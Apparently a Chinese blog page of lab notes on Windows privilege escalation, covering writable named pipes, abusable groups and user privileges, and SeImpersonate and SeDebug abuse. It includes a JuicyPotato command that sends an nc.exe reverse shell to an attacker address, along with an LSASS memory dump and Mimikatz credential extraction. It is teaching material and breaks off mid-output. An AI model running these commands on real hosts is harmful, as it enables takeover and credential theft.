class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure><h4 id="命名管提升权限的示例"><a href="#命名管提升权限的示例" class="headerlink" title="命名管提升权限的示例"></a>命名管提升权限的示例</h4><p><a href="https://www.exploit-db.com/exploits/48021">WindscribeService 命名管道权限提升</a> ，使用 accesschk，可以使用 <code>accesschk.exe -w \pipe\* -v</code> 等命令搜索允许写入访问的所有命名管道，并注意到 WindscribeService 命名管道允许 Everyone 组（即所有经过身份验证的用户）进行读取和写入访问。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> -<span class="title">accepteula</span> -<span class="title">w</span> \<span class="title">pipe</span>\<span class="title">WindscribeService</span> -<span class="title">v</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.13 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> ⌐ 2006-2020 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">\\.\<span class="title">Pipe</span>\<span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">Everyone</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure><p>检查 WindscribeService 命名管道权限，使用 accesschk 确认后，发现 Everyone 组确实对管道拥有 FILE_ALL_ACCESS（所有可能的访问权限）。可以利用这些宽松的权限将主机上的权限升级到 SYSTEM。</p><hr><h1 id="Privileges-Overview"><a href="#Privileges-Overview" class="headerlink" title="Privileges Overview"></a>Privileges Overview</h1><p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges">Windows 中的权限</a>是授予帐户在本地系统上执行各种操作的权利，例如管理服务、加载驱动程序、关闭系统、调试应用程序等。权限不同于访问权限，访问权限是系统用来授予或拒绝对可安全对象的访问的权利。用户和组权限存储在数据库中，并在用户登录系统时通过访问令牌授予。如果帐户属于 Active Directory 域，则帐户可以在特定计算机上拥有本地权限，并在不同的系统上拥有不同的权限。</p><h2 id="Windows-Authorization-Process"><a href="#Windows-Authorization-Process" class="headerlink" title="Windows Authorization Process"></a>Windows Authorization Process</h2><p>安全主体是 Windows 操作系统可以验证的任何内容，包括用户和计算机帐户、在安全上下文或其他用户&#x2F;计算机帐户中运行的进程，或这些帐户所属的安全组。安全主体是控制对 Windows 主机上的资源的访问的主要方式。每个安全主体都由唯一的<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">安全标识符 (SID)</a>标识。创建安全主体时，会为其分配一个 SID，该 SID 在其生命周期内一直分配给该主体。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732174929454.png" alt="auth_process"></p><h2 id="Rights-and-Privileges"><a href="#Rights-and-Privileges" class="headerlink" title="Rights and Privileges"></a>Rights and Privileges</h2><p>Windows 包含许多组，这些组授予其成员强大的权利和特权。其中许多组可以被滥用来提升独立 Windows 主机和 Active Directory 域环境中的特权。最终，这些组可用于在 Windows 工作站、服务器或域控制器 (DC) 上获得域管理员、本地管理员或系统特权。下面列出了其中一些组。</p><table><thead><tr><th>Group</th><th>Description</th></tr></thead><tbody><tr><td>Default Administrators</td><td>域管理员和企业管理员是“超级”组。</td></tr><tr><td>Server Operators</td><td>成员可以修改服务、访问 SMB 共享和备份文件。</td></tr><tr><td>Backup Operators</td><td>成员可以在本地登录 DC，应被视为域管理员。他们可以制作 SAM&#x2F;NTDS 数据库的卷影副本、远程读取注册表以及通过 SMB 访问 DC 上的文件系统。此组有时会添加到非 DC 上的本地备份操作员组中。</td></tr><tr><td>Print Operators</td><td>成员可以本地登录 DC 并“诱骗” Windows 加载恶意驱动程序。</td></tr><tr><td>Hyper-V Administrators</td><td>如果存在虚拟 DC，则任何虚拟化管理员（例如 Hyper-V 管理员成员）都应被视为域管理员。</td></tr><tr><td>Account Operators</td><td>成员可以修改域中不受保护的帐户和组。</td></tr><tr><td>Remote Desktop Users</td><td>默认情况下，成员没有被赋予任何有用的权限，但通常会被授予额外的权利，例如<code>Allow Login Through Remote Desktop Services</code>可以使用 RDP 协议横向移动。</td></tr><tr><td>Remote Management Users</td><td>成员可以使用 PSRemoting 登录到 DC（此组有时会添加到非 DC 上的本地远程管理组）。</td></tr><tr><td>Group Policy Creator Owners</td><td>成员可以创建新的 GPO，但需要委派额外的权限才能将 GPO 链接到域或 OU 等容器。</td></tr><tr><td>Schema Admins</td><td>成员可以修改 Active Directory 架构结构，并通过将受感染的帐户添加到默认对象 ACL 来为任何要创建的组&#x2F;GPO 设置后门。</td></tr><tr><td>DNS Admins</td><td>成员可以在 DC 上加载 DLL，但没有重新启动 DNS 服务器所需的权限。他们可以加载恶意 DLL 并等待重新启动作为持久性机制。加载 DLL 通常会导致服务崩溃。利用此组的更可靠方法是创建<a href="https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/">WPAD 记录</a>。</td></tr></tbody></table><h3 id="用户权限分配"><a href="#用户权限分配" class="headerlink" title="用户权限分配"></a>用户权限分配</h3><p>根据组成员身份和其他因素（例如通过域和本地组策略分配的权限），用户可以为其帐户分配各种权限。以下是一些关键的用户权限分配，它们是应用于本地主机的设置。这些权限允许用户在系统上执行任务，例如本地或远程登录、从网络访问主机、关闭服务器等。</p><table><thead><tr><th>Setting <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">Constant</a></th><th>Setting Name</th><th>Standard Assignment</th><th>Description</th></tr></thead><tbody><tr><td>SeNetworkLogonRight</td><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network">Access this computer from the network</a></td><td>Administrators, Authenticated Users</td><td>确定哪些用户可以从网络连接到设备。这是 SMB、NetBIOS、CIFS 和 COM+ 等网络协议所必需的。</td></tr><tr><td>SeRemoteInteractiveLogonRight</td><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services">Allow log on through Remote Desktop Services</a></td><td>Administrators, Remote Desktop Users</td><td>此策略设置确定哪些用户或组可以通过远程桌面服务连接访问远程设备的登录屏幕。用户可以与特定服务器建立远程桌面服务连接，但不能登录到同一服务器的控制台。</td></tr><tr><td>SeBackupPrivilege</td><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories">Back up files and directories</a></td><td>Administrators</td><td>此用户权限决定哪些用户可以绕过文件和目录、注册表和其他持久对象权限来备份系统。</td></tr><tr><td>SeSecurityPrivilege</td><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log">Manage auditing and security log</a></td><td>Administrators</td><td>此策略设置确定哪些用户可以为单个资源（例如文件、Active Directory 对象和注册表项）指定对象访问审核选项。这些对象指定其系统访问控制列表 (SACL)。分配了此用户权限的用户还可以在事件查看器中查看和清除安全日志。</td></tr><tr><td>SeTakeOwnershipPrivilege</td><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects">Take ownership of files or other objects</a></td><td>Administrators</td><td>此策略设置确定哪些用户可以拥有设备中任何可安全对象的所有权，包括 Active Directory 对象、NTFS 文件和文件夹、打印机、注册表项、服务、进程和线程。</td></tr><tr><td>SeDebugPrivilege</td><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs">Debug programs</a></td><td>Administrators</td><td>此策略设置确定哪些用户可以附加到或打开任何进程，即使是他们不拥有的进程。正在调试其应用程序的开发人员不需要此用户权限。正在调试新系统组件的开发人员需要此用户权限。此用户权限提供对敏感和关键操作系统组件的访问权限。</td></tr><tr><td>SeImpersonatePrivilege</td><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication">Impersonate a client after authentication</a></td><td>Administrators, Local Service, Network Service, Service</td><td>此策略设置确定哪些程序被允许模拟用户或另一个指定帐户并代表用户行事。</td></tr><tr><td>SeLoadDriverPrivilege</td><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers">Load and unload device drivers</a></td><td>Administrators</td><td>此策略设置确定哪些用户可以动态加载和卸载设备驱动程序。如果设备上的 driver.cab 文件中已存在新硬件的签名驱动程序，则不需要此用户权限。设备驱动程序作为高权限代码运行。</td></tr><tr><td>SeRestorePrivilege</td><td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories">Restore files and directories</a></td><td>Administrators</td><td>此安全设置确定哪些用户在还原备份文件和目录时可以绕过文件、目录、注册表和其他持久对象权限。它确定哪些用户可以将有效的安全主体设置为对象的所有者。</td></tr></tbody></table><p><code>whoami /priv </code> 打印当前用户的权限的列表。某些权限仅供管理用户使用，并且仅在运行提升的 cmd 或 PowerShell 会话时才能列出&#x2F;利用。这些提升权限和用户帐户控制 (UAC) 的概念是 Windows Vista 引入的安全功能，默认限制应用程序在必要时以完全权限运行。</p><h3 id="管理用户权限"><a href="#管理用户权限" class="headerlink" title="管理用户权限"></a>管理用户权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami </span><br><span class="line"></span><br><span class="line">winlpe<span class="literal">-srv01</span>\administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                            Description                                                        State</span><br><span class="line">========================================= ================================================================== ========</span><br><span class="line">SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="keyword">for</span> a <span class="keyword">process</span>                                 Disabled</span><br><span class="line">SeSecurityPrivilege                       Manage auditing and security log                                   Disabled</span><br><span class="line">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled</span><br><span class="line">SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled</span><br><span class="line">SeSystemProfilePrivilege                  Profile system performance                                         Disabled</span><br><span class="line">SeSystemtimePrivilege                     Change the system time                                             Disabled</span><br><span class="line">SeProfileSingleProcessPrivilege           Profile single <span class="keyword">process</span>                                             Disabled</span><br><span class="line">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled</span><br><span class="line">SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled</span><br><span class="line">SeBackupPrivilege                         Back up files and directories                                      Disabled</span><br><span class="line">SeRestorePrivilege                        Restore files and directories                                      Disabled</span><br><span class="line">SeShutdownPrivilege                       Shut down the system                                               Disabled</span><br><span class="line">SeDebugPrivilege                          Debug programs                                                     Disabled</span><br><span class="line">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled</span><br><span class="line">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled</span><br><span class="line">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled</span><br><span class="line">SeUndockPrivilege                         Remove computer from docking station                               Disabled</span><br><span class="line">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled</span><br><span class="line">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled</span><br><span class="line">SeCreateGlobalPrivilege                   Create global objects                                              Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege             Increase a <span class="keyword">process</span> working <span class="built_in">set</span>                                     Disabled</span><br><span class="line">SeTimeZonePrivilege                       Change the time zone                                               Disabled</span><br><span class="line">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled</span><br><span class="line">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="keyword">for</span> another user <span class="keyword">in</span> the same session Disabled </span><br></pre></td></tr></table></figure><p>当帐户的权限处于禁用状态时，这意味着帐户已分配特定权限。但是，在启用权限之前，它不能用于访问令牌以执行相关操作。Windows 不提供内置命令或 PowerShell cmdlet 来启用权限，因此需要一些脚本来帮助提升权限。</p><h3 id="标准用户权限"><a href="#标准用户权限" class="headerlink" title="标准用户权限"></a>标准用户权限</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami </span><br><span class="line"></span><br><span class="line">winlpe<span class="literal">-srv01</span>\htb<span class="literal">-student</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span> Disabled</span><br></pre></td></tr></table></figure><h3 id="备份操作员权限"><a href="#备份操作员权限" class="headerlink" title="备份操作员权限"></a>备份操作员权限</h3><p>此组中的用户确实拥有 UAC 当前限制的其他权限。不过，可以从此命令中看到他们拥有 SeShutdownPrivilege，这意味着他们可以关闭域控制器，如果他们在本地（而不是通过 RDP 或 WinRM）登录域控制器，可能会导致大规模服务中断。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span> Disabled</span><br></pre></td></tr></table></figure><hr><h1 id="User-Privileges"><a href="#User-Privileges" class="headerlink" title="User Privileges"></a>User Privileges</h1><h2 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &amp; SeAssignPrimaryToken"></a>SeImpersonate &amp; SeAssignPrimaryToken</h2><p>在 Windows 中，每个进程都有一个令牌，其中包含有关运行该进程的帐户的信息。要使用令牌，<code>SeImpersonate</code>需要特权。它只提供给管理帐户，在大多数情况下，可以在系统强化期间删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Privilege Name                Description                               State      </span><br><span class="line"></span><br><span class="line">============================= ========================================= ========   </span><br><span class="line"></span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   </span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    </span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled    </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled    </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </span><br></pre></td></tr></table></figure><p><a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> 可用于通过 DCOM&#x2F;NTLM 反射滥用来利用 SeImpersonate 或 SeAssignPrimaryToken 权限。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; .\<span class="title">JuicyPotato.exe</span> -<span class="title">l</span> 53375 -<span class="title">p</span> <span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">cmd.exe</span> -<span class="title">a</span> &quot;/<span class="title">c</span> .\<span class="title">nc.exe</span> 10.10.14.3 8443 -<span class="title">e</span> <span class="title">cmd.exe</span>&quot; -<span class="title">t</span> *</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 8443</span><br><span class="line"></span><br><span class="line">listening on [any] 8443 ...</span><br><span class="line">connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line"></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure><p>JuicyPotato 不适用于 Windows Server 2019 和 Windows 10 build 1809 及更高版本。<a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a>和<a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a>可用于利用相同的权限并获得<code>NT AUTHORITY\SYSTEM</code>级别访问权限。</p><h2 id="SeDebugPrivilege"><a href="#SeDebugPrivilege" class="headerlink" title="SeDebugPrivilege"></a>SeDebugPrivilege</h2><p>要运行特定应用程序或服务或协助进行故障排除，可以为用户分配 SeDebugPrivilege，而不是将帐户添加到管理员组。默认情况下，只有管理员被授予此权限，因为它可用于从系统内存中捕获敏感信息，或访问&#x2F;修改内核和应用程序结构。</p><p>Windows 设置</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731553925420.png" alt="debug"></p><p>查看权限</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">priv</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">----------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>                            <span class="title">Description</span>                                                        <span class="title">State</span></span></span><br><span class="line"><span class="function">========================================= ================================================================== ========</span></span><br><span class="line"><span class="function"><span class="title">SeDebugPrivilege</span>                          <span class="title">Debug</span> <span class="title">programs</span>                                                     <span class="title">Disabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeChangeNotifyPrivilege</span>                   <span class="title">Bypass</span> <span class="title">traverse</span> <span class="title">checking</span>                                           <span class="title">Enabled</span></span></span><br><span class="line"><span class="function"><span class="title">SeIncreaseWorkingSetPrivilege</span>             <span class="title">Increase</span> <span class="title">a</span> <span class="title">process</span> <span class="title">working</span> <span class="title">set</span>                                     <span class="title">Disabled</span></span></span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">SysInternals</a> 套件中的  <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a> 可以利用此权限并转储进程内存</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">procdump.exe</span> -<span class="title">accepteula</span> -<span class="title">ma</span> <span class="title">lsass.exe</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">ProcDump</span> <span class="title">v10</span>.0 - <span class="title">Sysinternals</span> <span class="title">process</span> <span class="title">dump</span> <span class="title">utility</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2009-2020 <span class="title">Mark</span> <span class="title">Russinovich</span> <span class="title">and</span> <span class="title">Andrew</span> <span class="title">Richards</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[15:25:45] <span class="title">Dump</span> 1 <span class="title">initiated</span>: <span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">Procdump</span>\<span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function">[15:25:45] <span class="title">Dump</span> 1 <span class="title">writing</span>: <span class="title">Estimated</span> <span class="title">dump</span> <span class="title">file</span> <span class="title">size</span> <span class="title">is</span> 42 <span class="title">MB</span>.</span></span><br><span class="line"><span class="function">[15:25:45] <span class="title">Dump</span> 1 <span class="title">complete</span>: 43 <span class="title">MB</span> <span class="title">written</span> <span class="title">in</span> 0.5 <span class="title">seconds</span></span></span><br><span class="line"><span class="function">[15:25:46] <span class="title">Dump</span> <span class="title">count</span> <span class="title">reached</span>.</span></span><br></pre></td></tr></table></figure><p>如果具有 RDP 访问权限，还可以通过任务管理器手动转储 LSASS 进程的内存，”详细信息”选项卡，选择 LSASS 进程，然后选择”创建转储文件”。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1731556395375.png" alt="WPE_taskmgr_lsass"></p><p>然后可以使用 sekurlsa::minidump 命令将其加载到 Mimikatz 中。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">mimikatz.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  .#####.   <span class="title">mimikatz</span> 2.2.0 (<span class="title">x64</span>) #19041 <span class="title">Sep</span> 18 2020 19:18:29</span></span><br><span class="line"><span class="function"> .## ^ ##.  &quot;<span class="title">A</span> <span class="title">La</span> <span class="title">Vie</span>, <span class="title">A</span> <span class="title">L</span>&#x27;<span class="title">Amour</span>&quot; - (<span class="title">oe.eo</span>)</span></span><br><span class="line"><span class="function"> ## / \ ##  /*** <span class="title">Benjamin</span> <span class="title">DELPY</span> `<span class="title">gentilkiwi</span>` ( <span class="title">benjamin</span>@<span class="title">gentilkiwi.com</span> )</span></span><br><span class="line"><span class="function"> ## \ / ##       &gt; <span class="title">https</span>://<span class="title">blog.gentilkiwi.com</span>/<span class="title">mimikatz</span></span></span><br><span class="line"><span class="function"> &#x27;## <span class="title">v</span> ##&#x27;       <span class="title">Vincent</span> <span class="title">LE</span> <span class="title">TOUX</span>             ( <span class="title">vincent.letoux</span>@<span class="title">gmail.com</span> )</span></span><br><span class="line"><span class="function">  &#x27;#####&#x27;        &gt; <span class="title">https</span>://<span class="title">pingcastle.com</span> / <span class="title">https</span>://<span class="title">mysmartlogon.com</span> ***/</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span> # <span class="title">log</span></span></span><br><span class="line"><span class="function"><span class="title">Using</span> &#x27;<span class="title">mimikatz.log</span>&#x27; <span class="title">for</span> <span class="title">logfile</span> : <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span> # <span class="title">sekurlsa</span>::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">Switch</span> <span class="title">to</span> <span class="title">MINIDUMP</span> : &#x27;<span class="title">lsass.dmp</span>&#x27;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span> # <span class="title">sekurlsa</span>::<span class="title">logonpasswords</span></span></span><br><span class="line"><span class="function"><span class="title">Opening</span> : &#x27;<span class="title">lsass.dmp</span>&#x27; <span class="title">file</span> <span class="title">for</span> <span class="title">minidump</span>...</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Authentication</span> <span class="title">Id</span> : 0 ; 23196355 (00000000:0161<span class="title">f2c3</span>)</span></span><br><span class="line"><span class="function"><span class="title">Session</span>           : <span class="title">Interactive</span> <span class="title">from</span> 4</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Name</span>         : <span class="title">DWM</span>-4</span></span><br><span class="line"><span class="function"><span class="title">Domain</span>            : <span class="title">Window</span> <span class="title">Manager</span></span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Server</span>      : (<span class="title">null</span>)</span></span><br><span class="line"><span class="function"><span class="title">Logon</span> <span class="title">Time</span>        : 3/31/2021 3:00:57 <span class="title">PM</span></span></span><br><span class="line"><span class="function"><span class="title">SID</span>               : <span class="title">S</span>-1-5-90-0-4</span></span><br><span class="line"><span class="function">        <span class="title">msv</span> :</span></span><br><span class="line"><span class="function">        <span class="title">tspkg</span> :</span></span><br><span class="line"><span class="function">        <span class="title">wdigest</span> :</span></span><br><span class="line"><span class="function">         * <span class="title">Username</span> : <span class="title">WINLPE</span>-<span class="title">SRV01</span>$</span></span><br><span class="line"><span class="function">         * <span class="title">Domain</span>   : <span class="title">WORKGROUP</span></span></span><br><span class="line"><span class="function">         * <span class="title">Password</span> : (<span class="title">null</span>)</span></span><br><span class="line"><span class="function">        <span class="title">kerberos</span> :</span></span><br><span class="line"><span class="function">        <span class="title">ssp</span> :</span></span><br><span class="line"><span class="function">        <span class="title">credman</span> :</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt; </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Authentication</span> <span class="title">Id</span> : 0 ; 23026942 (00000000:015<span class="title">f5cfe</span>)</span></span><br><span class="line"><span class="function"><span class="title">Session</span>           : <span class="title">RemoteInteractive</span> <span class="title">from</span> 2</span></span><br><span class="line"><span class="function"><span 